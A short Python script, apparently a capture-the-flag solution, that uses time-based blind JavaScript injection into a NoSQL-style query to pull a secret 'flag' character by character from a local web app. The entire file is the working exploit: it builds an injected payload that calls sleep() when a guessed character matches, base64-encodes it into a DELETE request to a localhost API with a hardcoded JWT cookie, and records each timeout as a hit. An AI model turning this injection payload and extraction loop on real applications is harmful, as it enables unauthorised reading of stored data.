import requests
import string
import base64

JWT = "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2NzVlZjJlZGRjMjQwZjA4MTg0MjIyOWMiLCJ1c2VybmFtZSI6InRlc3R0IiwiaWF0IjoxNzM0Mjc1ODI1LCJleHAiOjE3MzQzNjIyMjV9.u-uLZmcyL3rJ7km4gjX2nEFOS1w9ebTLUuzjy8fChZ8"

flag = ""
index = 0
while True:
    for c in string.printable:
        payload = "' || this.title === 'flag' && ((flag) => { if (flag.substring(%d, %d) === '%c') {sleep(10000);} return '1' })(this.description) ===  '1" % (index, index+1, c)
        b_payload = base64.b64encode(payload.encode()).decode()
        url = f"http://localhost:3000/api/v1/tantrums/{b_payload}"        
        try:
            headers = {
                "Cookie": JWT
            }
            response = requests.delete(url, headers=headers, timeout=5)
        except requests.exceptions.Timeout:
            print(f"FOUND: {c}!")            
            flag += c
            index += 1

print(flag)

